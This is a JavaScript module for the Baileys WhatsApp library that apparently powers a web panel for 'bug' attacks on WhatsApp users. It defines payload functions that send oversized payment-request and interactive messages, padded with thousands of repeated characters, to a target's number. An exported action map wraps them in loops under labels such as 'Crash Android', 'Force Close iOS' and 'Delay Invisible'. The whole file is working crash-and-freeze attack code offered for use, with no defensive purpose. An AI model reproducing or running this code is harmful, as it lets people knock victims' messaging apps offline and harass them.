const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- Fungsi Inti (Payload) ---

async function HxDCaelus(sock, target) {
    const X = { requestPaymentMessage: { currencyCodeIso4217: 'USD', amount1000: '999999999', requestFrom: target, noteMessage: { extendedTextMessage: { text: "ꦾ".repeat(5000) } } } };
    await sock.relayMessage(target, X, {
        messageId: crypto.randomBytes(16).toString('hex')
    });
}

async function FolwareDelay(sock, target) {
    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Miyako System" + "ꦾ".repeat(1000) },
                    nativeFlowMessage: {
                        buttons: [{ name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "copy", copy_code: "ꦾ".repeat(5000) }) }]
                    }
                }
            }
        }
    };
    const gen = generateWAMessageFromContent(target, msg, { userJid: sock.user.id });
    await sock.relayMessage(target, gen.message, { messageId: gen.key.id });
}

async function cv03(sock, target) {
    let MSG = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Crash" + "ꦾ".repeat(5000) },
                    nativeFlowMessage: {
                        buttons: [{ name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ꦾ".repeat(5000), id: "1" }) }]
                    }
                }
            }
        }
    };
    let gen = generateWAMessageFromContent(target, MSG, { userJid: sock.user.id });
    await sock.relayMessage(target, gen.message, { messageId: gen.key.id });
}

async function amountOne(sock, target) {
    const Null = {
        requestPaymentMessage: {
            amount: {
                value: 1,
                offset: 0,
                currencyCodeIso4217: "IDR",
                requestFrom: target,
                expiryTimestamp: Date.now()
            },
            contextInfo: {
                externalAdReply: {
                    title: "ZARRCRASH SYSTEM",
                    body: "X".repeat(1500),
                    mediaType: 1,
                    renderLargerThumbnail: false,
                    showAdAttribution: true,
                    sourceUrl: null,
                    thumbnailUrl: null
                }
            }
        }
    };
    await sock.relayMessage(target, Null, { participant: { jid: target } });
}

// --- Mapping ID (Actions) ---
// Pastikan key (delay, crash, dll) sama dengan data-val di HTML
const actions = {
    "delay": {
        name: "Delay Invisible",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 0; i < jumlah; i++) {
                await FolwareDelay(sock, target);
                await sleep(200);
            }
        }
    },
    "crash": {
        name: "Crash Android",
        execute: async (sock, target, jumlah = 10) => {
            for (let i = 0; i < jumlah; i++) {
                // Fix: Menggunakan HxDCaelus karena QcPay tidak ada
                await HxDCaelus(sock, target);
                await sleep(200);
            }
        }
    },
    "blank": {
        name: "Crash Ios",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 0; i < jumlah; i++) {
                await cv03(sock, target);
                await HxDCaelus(sock, target);
                await sleep(200);
            }
        }
    },
    "fcandro": {
        name: "Force Close WA",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 0; i < jumlah; i++) {
                await amountOne(sock, target);
                await amountOne(sock, target);
                await sleep(200);
            }
        }
    },
    "crashios": {
        name: "Blank Android",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 0; i < jumlah; i++) {
                await cv03(sock, target);
                await HxDCaelus(sock, target);
                await sleep(200);
            }
        }
    },
    "fcios": {
        name: "Force Close iOS",
        execute: async (sock, target, jumlah = 5) => {
            for (let i = 0; i < jumlah; i++) {
                await cv03(sock, target);
                await amountOne(sock, target);
                await sleep(200);
            }
        }
    }
};

// Export agar bisa dibaca oleh app.js / server.js
module.exports = actions;